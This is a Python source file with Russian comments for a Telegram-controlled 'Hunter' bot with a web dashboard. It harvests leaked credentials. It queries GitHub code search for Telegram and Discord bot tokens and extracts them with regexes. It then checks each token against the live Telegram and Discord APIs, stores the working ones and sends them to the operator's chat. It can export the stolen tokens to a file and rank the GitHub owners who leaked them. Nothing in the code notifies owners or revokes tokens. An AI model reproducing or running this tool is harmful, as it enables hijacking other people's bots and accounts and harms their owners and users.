import os
import re
import time
import json
import random
import io
import threading
import concurrent.futures
from typing import List, Dict, Optional, Tuple
from datetime import datetime, timedelta
from collections import Counter

import requests
import telebot
from telebot import types
from flask import Flask, jsonify, render_template_string
from rich.console import Console

# Для графиков
import matplotlib
matplotlib.use('Agg') # Важно для работы на серверах без экрана
import matplotlib.pyplot as plt

# =====================================================================
# ⬇️ НАСТРОЙКИ (Берутся из Render Environment Variables) ⬇️
# =====================================================================
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "ghp_ТВОЙ_ТОКЕН_ЗДЕСЬ")
CONTROL_BOT_TOKEN = os.getenv("CONTROL_BOT_TOKEN", "ТВОЙ_ТОКЕН_БОТА")
ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))
# =====================================================================

console = Console()
bot = telebot.TeleBot(CONTROL_BOT_TOKEN)

# Flask для Render
app = Flask(__name__)

TG_TOKEN_RE = re.compile(r"\b\d{8,10}:AA[A-Za-z0-9_-]{32}\b|\b\d{8,10}:[A-Za-z0-9_-]{35}\b")
DISCORD_TOKEN_RE = re.compile(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}")

GITHUB_API = "https://api.github.com/search/code"

# Файлы БД (Внимание: на бесплатном Render они стираются при перезапуске)
SEEN_DB_FILE = "seen_tokens.txt"
LIVE_DB_FILE = "live_tokens.json"

# Расширенное состояние поиска
search_state = {
    "is_searching": False,
    "stop_requested": False,
    "limit_live": 5,
    "found_live_current": 0,
    "checked_tokens": 0,
    "dead_tokens": 0,
    "scam_tokens": 0,
    "start_time": None,
    "current_query": "",
    "status_text": "Ожидание...",
    "logs": [],
    "phrase": "Готов к работе"
}

BASE_DORKS = ['BOT_TOKEN', 'TELEGRAM_BOT_TOKEN', 'bot_token', 'api.telegram.org', 'discord bot token', 'DISCORD_TOKEN']
LANGUAGES = ["python", "javascript", "php", "go", "typescript", "json", "env", ""]

HACKER_PHRASES = [
    "Сканирую сектора GitHub...", "Обхожу лимиты API...", "Ищу уязвимости...",
    "Анализирую байты...", "Дешифрую репозитории...", "Проверяю узлы сети...",
    "Собираю фрагменты кода...", "Ищу следы скамеров..."
]
SPINNERS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

db_lock = threading.Lock()

# ===================== БАЗА ДАННЫХ =====================
def load_seen_tokens() -> set:
    with db_lock:
        if os.path.exists(SEEN_DB_FILE):
            with open(SEEN_DB_FILE, "r", encoding="utf-8") as f:
                return set(line.strip() for line in f if line.strip())
        return set()

def append_seen_token(token: str):
    with db_lock:
        with open(SEEN_DB_FILE, "a", encoding="utf-8") as f:
            f.write(f"{token}\n")

def save_live_token(token_data: Dict):
    with db_lock:
        live_list = []
        if os.path.exists(LIVE_DB_FILE):
            with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                live_list = json.load(f)
        if not any(item["token"] == token_data["token"] for item in live_list):
            live_list.append(token_data)
            with open(LIVE_DB_FILE, "w", encoding="utf-8") as f:
                json.dump(live_list, f, ensure_ascii=False, indent=4)

def load_live_tokens() -> List[Dict]:
    with db_lock:
        if os.path.exists(LIVE_DB_FILE):
            with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return []

# ===================== ЛОГИ И ГРАФИКИ =====================
def add_log(text: str):
    time_str = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{time_str}] {text}"
    search_state["logs"].append(log_entry)
    if len(search_state["logs"]) > 4:
        search_state["logs"].pop(0)

def generate_stats_chart() -> io.BytesIO:
    labels = ['Живые', 'Мертвые', 'Скам']
    sizes = [search_state["found_live_current"], search_state["dead_tokens"], search_state["scam_tokens"]]
    colors = ['#00ff00', '#ff0000', '#ffaa00']
    
    if sum(sizes) == 0:
        sizes = [1]
        labels = ['Нет данных']
        colors = ['#333333']

    fig, ax = plt.subplots(figsize=(6, 4), facecolor='#1e1e1e')
    ax.set_facecolor('#1e1e1e')
    
    wedges, texts, autotexts = ax.pie(
        sizes, labels=labels, colors=colors, autopct='%1.1f%%',
        textprops={'color': 'white', 'fontweight': 'bold'},
        startangle=140
    )
    
    ax.set_title('Статистика Охоты', color='#00ff00', fontweight='bold')
    
    buf = io.BytesIO()
    plt.savefig(buf, format='png', facecolor='#1e1e1e')
    buf.seek(0)
    plt.close(fig)
    return buf

# ===================== ПРОВЕРКА ТОКЕНОВ =====================
def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool]:
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        r = requests.get(url, timeout=5)
        data = r.json()
        if data.get("ok"):
            username = data["result"].get("username", "")
            first_name = data["result"].get("first_name", "").lower()
            username_lower = username.lower()
            scam_keywords = ["support", "security", "crypto", "giveaway", "bonus", "airdrop", "check", "verify", "official", "help", "проверка"]
            is_suspicious = any(word in first_name or word in username_lower for word in scam_keywords)
            return True, username, is_suspicious
    except Exception:
        pass
    return False, None, False

def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool]:
    url = "https://discord.com/api/v10/users/@me"
    headers = {"Authorization": f"Bot {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return True, data.get("username", ""), False
    except Exception:
        pass
    return False, None, False

# ===================== FLASK ВЕБ-ДАШБОРД =====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Hunter Dashboard</title>
    <meta charset="utf-8">
    <style>
        body { background-color: #0d1117; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { text-align: center; text-shadow: 0 0 10px #00ff00; }
        .stats { border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 10px #00ff00; }
        .log { color: #aaaaaa; font-size: 0.9em; margin-top: 10px; }
    </style>
    <script>
        function updateData() {
            fetch('/api/stats')
            .then(response => response.json())
            .then(data => {
                document.getElementById('time').innerText = data.time;
                document.getElementById('checked').innerText = data.checked;
                document.getElementById('found').innerText = data.found;
                document.getElementById('query').innerText = data.query;
                document.getElementById('status').innerText = data.status;
                
                let logDiv = document.getElementById('logs');
                logDiv.innerHTML = '';
                data.logs.forEach(l => {
                    logDiv.innerHTML += `<div>> ${l}</div>`;
                });
            });
        }
        setInterval(updateData, 1000);
    </script>
</head>
<body>
    <h1>[ HUNTER DASHBOARD ]</h1>
    <div class="stats">
        <p>⏱ Время работы: <span id="time">00:00:00</span></p>
        <p>🔍 Проверено: <span id="checked">0</span></p>
        <p>🟢 Найдено живых: <span id="found">0</span></p>
        <p>📡 Текущий запрос: <span id="query">...</span></p>
        <p>⚠️ Статус: <span id="status">...</span></p>
        <div class="log" id="logs"></div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    return "OK", 200

@app.route('/api/stats')
def api_stats():
    elapsed = int(time.time() - search_state["start_time"]) if search_state["start_time"] else 0
    res = {
        "time": format_time(elapsed),
        "checked": search_state["checked_tokens"],
        "found": search_state["found_live_current"],
        "query": search_state["current_query"],
        "status": search_state["status_text"],
        "logs": search_state["logs"]
    }
    return jsonify(res)

# ===================== ПОИСК НА GITHUB =====================
def search_github_dynamic() -> Tuple[List[Dict], int]:
    findings = []
    seen_tokens = load_seen_tokens()
    
    base = random.choice(BASE_DORKS)
    lang = random.choice(LANGUAGES)
    lang_part = f" language:{lang}" if lang else ""
    
    query = f"{base} in:file{lang_part}"
    search_state["current_query"] = query
    
    page = random.randint(1, 3)
    headers = {"Accept": "application/vnd.github.text-match+json", "Authorization": f"token {GITHUB_TOKEN}"}
    params = {"q": query, "per_page": 100, "page": page, "sort": "indexed", "order": "desc"}

    try:
        resp = requests.get(GITHUB_API, headers=headers, params=params, timeout=15)
        
        if resp.status_code == 401:
            search_state["status_text"] = "❌ Ошибка 401: Токен GitHub неверный!"
            search_state["stop_requested"] = True
            return [], 401
            
        if resp.status_code == 403:
            search_state["status_text"] = "⚠️ Лимит GitHub. Отдых 60с"
            add_log("⚠️ Лимит GitHub. Ждем...")
            time.sleep(60)
            return [], 403
            
        resp.raise_for_status()
        data = resp.json()
        items = data.get("items", [])

        for item in items:
            for match in item.get("text_matches", []):
                fragment = match.get("fragment", "")
                
                for t in TG_TOKEN_RE.findall(fragment):
                    if t not in seen_tokens:
                        findings.append({"type": "Telegram", "token": t, "repo": item["repository"]["full_name"], "url": item["html_url"]})
                        append_seen_token(t)
                
                for t in DISCORD_TOKEN_RE.findall(fragment):
                    if t not in seen_tokens:
                        findings.append({"type": "Discord", "token": t, "repo": item["repository"]["full_name"], "url": item["html_url"]})
                        append_seen_token(t)
                        
        time.sleep(10) 
        search_state["status_text"] = "✅ Поиск идет..."
        return findings, 200
        
    except Exception:
        time.sleep(10)
        return [], 500

# ===================== TELEGRAM БОТ =====================
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('🚀 Начать поиск', '🛑 Остановить', '⚙️ Настройки', '🗂 База живых токенов')
    return markup

def get_progress_buttons():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 График", callback_data="show_chart"),
        types.InlineKeyboardButton("🗂 Топ-5", callback_data="show_top5"),
        types.InlineKeyboardButton("🔄 Обновить", callback_data="force_update"),
        types.InlineKeyboardButton("🛑 Стоп", callback_data="stop_search_btn")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "👋 <b>Пульт Hunter Bot MASTER на Render!</b>\nЖми кнопку ниже!", reply_markup=get_main_menu(), parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '⚙️ Настройки')
def show_settings(message):
    if message.chat.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("1", callback_data="limit_1"),
        types.InlineKeyboardButton("3", callback_data="limit_3"),
        types.InlineKeyboardButton("5", callback_data="limit_5"),
        types.InlineKeyboardButton("10", callback_data="limit_10"),
        types.InlineKeyboardButton("∞", callback_data="limit_999")
    )
    bot.send_message(message.chat.id, f"⚙️ <b>Текущий лимит:</b> {search_state['limit_live']}\nВыбери новый:", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith('limit_'))
def callback_settings(call):
    limit = int(call.data.split('_')[1])
    search_state["limit_live"] = limit
    bot.answer_callback_query(call.id, "Лимит обновлен!")
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"✅ <b>Лимит установлен:</b> {limit if limit != 999 else 'Без лимита'}", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '🛑 Остановить')
def stop_command(message):
    if message.chat.id != ADMIN_ID: return
    if not search_state["is_searching"]:
        bot.send_message(message.chat.id, "Сейчас ничего не ищется.")
        return
    search_state["stop_requested"] = True
    bot.send_message(message.chat.id, "⏹️ Команда остановки принята.")

@bot.callback_query_handler(func=lambda call: call.data == 'show_chart')
def cb_show_chart(call):
    bot.answer_callback_query(call.id, "Генерирую диаграмму...")
    buf = generate_stats_chart()
    bot.send_photo(call.message.chat.id, buf, caption="📊 Текущая статистика поиска")

@bot.callback_query_handler(func=lambda call: call.data == 'show_top5')
def cb_show_top5(call):
    bot.answer_callback_query(call.id, "Собираю Топ-5...")
    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.send_message(call.message.chat.id, "База пуста, топ не собран.")
        return
    
    owners = [t["repo"].split("/")[0] for t in live_tokens]
    top_owners = Counter(owners).most_common(5)
    
    text = "🏆 <b>Топ-5 авторов утечек:</b>\n\n"
    for i, (owner, count) in enumerate(top_owners, 1):
        text += f"{i}. <a href='https://github.com/{owner}'>{owner}</a> — {count} токенов\n"
    
    bot.send_message(call.message.chat.id, text, parse_mode='HTML', disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data == 'stop_search_btn')
def cb_stop_search(call):
    search_state["stop_requested"] = True
    bot.answer_callback_query(call.id, "Остановка...")

@bot.callback_query_handler(func=lambda call: call.data == 'force_update')
def cb_force_update(call):
    bot.answer_callback_query(call.id, "Обновлено!")
    update_progress_message(call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda message: message.text == '🗂 База живых токенов')
def show_live_db(message):
    if message.chat.id != ADMIN_ID: return
    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.send_message(message.chat.id, "База пока пуста.")
        return
    text = "🗂 <b>Найденные боты (последние 20):</b>\n\n"
    for i, t in enumerate(live_tokens[-20:], 1):
        scam = "⚠️" if t["scam"] else "✅"
        platform = "TG" if t.get("type") == "Telegram" else "DC"
        text += f"{scam} [{platform}] @{t['bot']} | <code>{t['token']}</code>\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📥 Экспорт всех в файл", callback_data="export_file"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup, disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data == 'export_file')
def export_live_db(call):
    live_tokens = load_live_tokens()
    filename = f"live_tokens_{datetime.now().strftime('%m-%d_%H-%M')}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        for t in live_tokens:
            f.write(f"[{t.get('type', 'TG')}] @{t['bot']} | {t['token']} | {t['url']}\n")
    with open(filename, "rb") as f:
        bot.send_document(call.message.chat.id, f)

@bot.message_handler(func=lambda message: message.text == '🚀 Начать поиск')
def start_search_command(message):
    if search_state["is_searching"]:
        bot.send_message(message.chat.id, "⚠️ Поиск уже идет!")
        return
    
    search_state.update({
        "is_searching": True, "stop_requested": False, "found_live_current": 0,
        "checked_tokens": 0, "dead_tokens": 0, "scam_tokens": 0,
        "start_time": time.time(), "status_text": "Запуск...", "logs": []
    })
    
    msg = bot.send_message(message.chat.id, "⏳ <b>Инициализация...</b>", parse_mode='HTML')
    
    threading.Thread(target=live_ui_updater, args=(message.chat.id, msg.message_id), daemon=True).start()
    threading.Thread(target=run_search_task, args=(message.chat.id, msg.message_id)).start()

def live_ui_updater(chat_id, msg_id):
    spinner_idx = 0
    while search_state["is_searching"] and not search_state["stop_requested"]:
        search_state["phrase"] = random.choice(HACKER_PHRASES)
        update_progress_message(chat_id, msg_id, spinner_idx)
        spinner_idx += 1
        time.sleep(3)

def update_progress_message(chat_id, msg_id, spinner_idx=0):
    elapsed = int(time.time() - search_state["start_time"]) if search_state["start_time"] else 0
    spinner = SPINNERS[spinner_idx % len(SPINNERS)]
    
    logs_text = "\n".join(search_state["logs"]) if search_state["logs"] else "> Ожидание данных..."

    text = (
        f"{spinner} <b>Идет кибер-поиск...</b>\n\n"
        f"⏱ Время: <code>{format_time(elapsed)}</code>\n"
        f"🔍 Проверено: <code>{search_state['checked_tokens']}</code>\n"
        f"🟢 Живых: <code>{search_state['found_live_current']} / {search_state['limit_live']}</code>\n\n"
        f"📡 Запрос: <code>{search_state['current_query']}</code>\n\n"
        f"📟 <b>Консоль событий:</b>\n<pre>{logs_text}</pre>\n"
        f"⚙️ <i>{search_state['phrase']}</i>"
    )
    
    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id, text=text, 
            parse_mode='HTML', reply_markup=get_progress_buttons()
        )
    except Exception:
        pass

def run_search_task(chat_id, msg_id):
    try:
        while not search_state["stop_requested"]:
            if search_state["found_live_current"] >= search_state["limit_live"]:
                search_state["status_text"] = "🏁 Достигнут лимит."
                add_log("🏁 Лимит достигнут!")
                break

            raw_findings, code = search_github_dynamic()
            
            if code == 401: break
            if not raw_findings:
                continue

            for f in raw_findings:
                if search_state["stop_requested"] or search_state["found_live_current"] >= search_state["limit_live"]:
                    break
                
                add_log(f"🔍 Проверяю {f['type']} в {f['repo'][:15]}...")

                if f["type"] == "Telegram":
                    is_live, bot_username, is_scam = check_telegram_token(f["token"])
                else:
                    is_live, bot_username, is_scam = check_discord_token(f["token"])

                search_state["checked_tokens"] += 1
                
                if is_live:
                    search_state["found_live_current"] += 1
                    if is_scam: search_state["scam_tokens"] += 1
                    
                    token_info = {
                        "type": f["type"], "token": f["token"], "repo": f["repo"], "url": f["url"],
                        "bot": bot_username, "scam": is_scam
                    }
                    save_live_token(token_info)
                    
                    add_log(f"🟢 БИНГО! @{bot_username}")
                    
                    platform_tag = "TG" if f["type"] == "Telegram" else "Discord"
                    scam_tag = "⚠️" if is_scam else "✅"
                    
                    msg = (
                        f"🚨 <b>НАЙДЕН {platform_tag} БОТ!</b> ({search_state['found_live_current']}/{search_state['limit_live']})\n\n"
                        f"🤖 Бот: @{bot_username}\n"
                        f"🏷 Статус: {scam_tag}\n"
                        f"🔗 <a href='{f['url']}'>Репозиторий</a>\n"
                        f"🔑 Токен: <code>{f['token']}</code>"
                    )
                    try:
                        bot.send_message(chat_id, msg, parse_mode='HTML', disable_web_page_preview=True)
                    except:
                        pass
                else:
                    search_state["dead_tokens"] += 1
                    add_log(f"❌ Мертвый токен ({f['type']})")

    finally:
        search_state["is_searching"] = False
        elapsed = int(time.time() - search_state["start_time"])
        final_text = (
            f"🏁 <b>Поиск завершен.</b>\n"
            f"⏱ Время: {format_time(elapsed)}\n"
            f"🔍 Проверено: {search_state['checked_tokens']}\n"
            f"🟢 Живых: {search_state['found_live_current']}\n"
        )
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=final_text, parse_mode='HTML', reply_markup=None)
        except:
            pass

def format_time(seconds):
    m, s = divmod(seconds, 60)
    h, m = divmod(m, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

# ===================== ЗАПУСК =====================
def run_bot():
    console.print("[bold green]✅ БОТ ЗАПУЩЕН В ФОНЕ![/bold green]")
    bot.infinity_polling()

if __name__ == "__main__":
    # Запускаем бота в отдельном потоке, чтобы Flask мог работать
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Запускаем веб-сервер (Render передаст нужный порт в переменную PORT)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
